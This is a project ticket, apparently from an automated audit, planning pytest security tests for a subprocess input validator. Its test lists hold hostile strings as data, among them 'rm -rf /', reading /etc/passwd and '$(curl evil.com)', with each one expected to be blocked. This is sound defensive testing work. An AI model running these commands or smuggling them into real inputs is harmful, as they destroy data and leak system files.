---
id: TKT-sec1-004
parent: WE-260109-sec1
title: "Add security tests for input validation"
status: open
priority: HIGH
created: 2026-01-09T00:00:00.000Z
created_by: claude_audit
assigned_to: null
depends_on: [TKT-sec1-002]
---

# TKT-sec1-004: Add security tests for input validation

## Metadata
- **Created**: Thursday, January 9, 2026
- **Parent Work Effort**: WE-260109-sec1
- **Author**: Claude Audit System
- **Priority**: HIGH
- **Estimated Effort**: 2 tickets
- **Dependencies**: TKT-sec1-002 (input validation layer must exist first)

## Description

Create comprehensive security tests to verify input validation prevents command injection, path traversal, and other attacks. These tests should attempt actual attacks and verify they're blocked.

## Current State

**Existing Security Testing**: ✅ Excellent
- `big_bad_wolf.py`: Comprehensive decision engine attack tests
- Tests negative weights, invalid types, massive loads, missing data
- Good model for subprocess security tests

**Missing**: ❌ Subprocess and input validation security tests

## Acceptance Criteria

- [ ] Security test suite for subprocess validation
- [ ] Tests cover all attack vectors (injection, traversal, overflow)
- [ ] Tests verify both blocking attacks AND allowing valid input
- [ ] Integration with existing test suite (pytest)
- [ ] CI runs security tests automatically
- [ ] Documentation on security testing approach

## Implementation Plan

### Step 1: Create Security Test File

Create `tests/test_security_subprocess.py`:

```python
"""
Security tests for subprocess input validation.

Tests that malicious input is blocked while valid input is allowed.
Inspired by big_bad_wolf.py's approach to security testing.
"""

import pytest
from src.waft.core.subprocess_validator import SubprocessValidator


class TestProjectNameValidation:
    """Test project name input validation."""

    def test_valid_project_names(self):
        """Valid project names should pass validation."""
        valid_names = [
            "myproject",
            "my-project",
            "my_project",
            "Project123",
            "a",
            "project-name-123",
        ]

        for name in valid_names:
            result = SubprocessValidator.validate_project_name(name)
            assert result == name, f"Valid name '{name}' should pass"

    def test_command_injection_attempts(self):
        """Command injection attempts should be blocked."""
        injection_attempts = [
            "project; rm -rf /",
            "project`whoami`",
            "project$(ls)",
            "project && echo hacked",
            "project || cat /etc/passwd",
            "project\nrm -rf /",
            "project\0whoami",
            "project;whoami",
            "../../../etc/passwd",
            "project$(curl evil.com)",
        ]

        for malicious in injection_attempts:
            with pytest.raises(ValueError, match="invalid characters"):
                SubprocessValidator.validate_project_name(malicious)

    def test_path_traversal_attempts(self):
        """Path traversal attempts should be blocked."""
        traversal_attempts = [
            "../project",
            "../../project",
            "./project",
            "~/project",
            "/etc/project",
            "C:\\Windows\\project",
        ]

        for malicious in traversal_attempts:
            with pytest.raises(ValueError):
                SubprocessValidator.validate_project_name(malicious)

    def test_length_limits(self):
        """Extremely long names should be blocked."""
        too_long = "a" * 1000
        with pytest.raises(ValueError, match="length"):
            SubprocessValidator.validate_project_name(too_long)

    def test_empty_or_none(self):
        """Empty or None names should be blocked."""
        with pytest.raises(ValueError):
            SubprocessValidator.validate_project_name("")

        with pytest.raises((ValueError, TypeError)):
            SubprocessValidator.validate_project_name(None)


class TestPackageNameValidation:
    """Test package name input validation."""

    def test_valid_package_names(self):
        """Valid package names should pass validation."""
        valid_names = [
            "requests",
            "flask",
            "django-rest-framework",
            "typing_extensions",
            "Pillow",
            "scikit-learn",
            "numpy",
            "pytest-cov",
        ]

        for name in valid_names:
            result = SubprocessValidator.validate_package_name(name)
            assert result == name

    def test_malicious_package_names(self):
        """Malicious package names should be blocked."""
        malicious_names = [
            "package; rm -rf /",
            "package`whoami`",
            "package$(curl evil.com)",
            "../../../etc/passwd",
        ]

        for malicious in malicious_names:
            with pytest.raises(ValueError):
                SubprocessValidator.validate_package_name(malicious)


class TestFindingTextValidation:
    """Test user-provided text validation (findings, messages, etc.)."""

    def test_valid_findings(self):
        """Valid finding text should pass validation."""
        valid_findings = [
            "Found bug in authentication",
            "Need to refactor UserManager",
            "Performance issue with database queries",
            "Todo: Add tests for new feature",
        ]

        for finding in valid_findings:
            result = SubprocessValidator.validate_finding_text(finding)
            assert result == finding

    def test_null_byte_removal(self):
        """Null bytes should be removed from finding text."""
        finding_with_null = "Finding\0with\0null"
        result = SubprocessValidator.validate_finding_text(finding_with_null)
        assert '\0' not in result
        assert result == "Findingwithnull"

    def test_extremely_long_findings(self):
        """Extremely long findings should be blocked."""
        too_long = "x" * 20000
        with pytest.raises(ValueError, match="exceeds"):
            SubprocessValidator.validate_finding_text(too_long)

    def test_empty_findings(self):
        """Empty findings should be blocked."""
        with pytest.raises(ValueError, match="empty"):
            SubprocessValidator.validate_finding_text("")


class TestShellQuoting:
    """Test shell quoting for special characters."""

    def test_quotes_special_chars(self):
        """Special characters should be quoted."""
        test_cases = [
            ("normal", "normal"),  # No quotes needed
            ("with space", "'with space'"),
            ("with'quote", "'with'\"'\"'quote'"),
        ]

        for input_str, expected in test_cases:
            result = SubprocessValidator.quote_if_needed(input_str)
            # shlex.quote behavior varies, just verify it's safe
            assert isinstance(result, str)


# Integration test with actual subprocess calls
@pytest.mark.integration
class TestSubprocessIntegration:
    """Integration tests with actual subprocess calls."""

    def test_substrate_init_with_valid_name(self, tmp_path):
        """Test SubstrateManager with validated project name."""
        from src.waft.core.substrate import SubstrateManager

        substrate = SubstrateManager(tmp_path)
        # This should NOT raise an exception
        # (actual test depends on uv being installed)
        pass

    def test_substrate_init_with_malicious_name(self, tmp_path):
        """Test SubstrateManager blocks malicious project name."""
        from src.waft.core.substrate import SubstrateManager

        substrate = SubstrateManager(tmp_path)

        with pytest.raises(ValueError):
            substrate.init_project("project; rm -rf /")
```

### Step 2: Extend big_bad_wolf.py

Add subprocess security tests to the existing security test suite:

```python
# Add to big_bad_wolf.py

def test_subprocess_security():
    """Test subprocess input validation against attacks."""
    print("\n🐺 ATTACK: Subprocess Command Injection...")

    from src.waft.core.subprocess_validator import SubprocessValidator

    injection_attempts = [
        "project; rm -rf /",
        "project`whoami`",
        "project$(curl evil.com)",
    ]

    blocked_count = 0
    for attack in injection_attempts:
        try:
            SubprocessValidator.validate_project_name(attack)
            print(f"❌ BREACH! Attack passed: {attack}")
        except ValueError:
            blocked_count += 1
            print(f"🧱 BLOCKED! Attack stopped: {attack}")

    if blocked_count == len(injection_attempts):
        print("✅ All attacks blocked - Security holds!")
    else:
        print(f"💥 SECURITY BREACH! {len(injection_attempts) - blocked_count} attacks passed!")
```

### Step 3: CI Integration

Update `.github/workflows/ci.yml`:

```yaml
- name: Run Security Tests
  run: |
    pytest tests/test_security_subprocess.py -v
    python big_bad_wolf.py
```

## Test Coverage Goals

| Category | Test Count | Status |
|----------|------------|--------|
| **Valid Input** | 10+ | ✅ Must pass |
| **Command Injection** | 10+ | ❌ Must block |
| **Path Traversal** | 6+ | ❌ Must block |
| **Length Attacks** | 2+ | ❌ Must block |
| **Special Characters** | 5+ | ✅ Must handle |
| **Integration Tests** | 3+ | ✅ End-to-end |

**Total**: ~40 security test cases

## Files to Create/Modify

**New Files**:
- `tests/test_security_subprocess.py` (comprehensive security tests)

**Modified Files**:
- `big_bad_wolf.py` (extend with subprocess tests)
- `.github/workflows/ci.yml` (run security tests in CI)
- `pytest.ini` or `pyproject.toml` (add security test markers)

## Testing Strategy

1. **Red-Green-Refactor**:
   - Write tests that expect attacks to be blocked
   - Implement validation (TKT-sec1-002)
   - Watch tests turn green

2. **Attack Scenarios**:
   - Command injection (`;`, `` ` ``, `$()`, `&&`, `||`)
   - Path traversal (`../`, `~/`, absolute paths)
   - Null bytes (`\0`)
   - Buffer overflow (extremely long strings)
   - Unicode attacks (if applicable)

3. **Regression Prevention**:
   - Tests ensure security doesn't regress
   - CI fails if attacks pass validation

## Documentation

Create `docs/SECURITY_TESTING.md`:

```markdown
# Security Testing Strategy

## Philosophy

Security testing is adversarial - we actively try to break our own security.

## Test Suite

- `tests/test_security_subprocess.py`: Input validation security
- `big_bad_wolf.py`: Decision engine security (existing)

## Running Security Tests

```bash
# All security tests
pytest tests/test_security*.py -v

# Subprocess security specifically
pytest tests/test_security_subprocess.py -v

# Big Bad Wolf attacks
python big_bad_wolf.py
```

## Adding New Security Tests

When adding features that accept user input:
1. Add validation to `SubprocessValidator`
2. Add tests to `test_security_subprocess.py`
3. Try to break it!
```

## Related Issues

- TKT-sec1-002: Input validation implementation
- Existing: big_bad_wolf.py (excellent security test model)
- Audit: "Command Injection Risks (CRITICAL)"

## Commits

- (populated as work progresses)
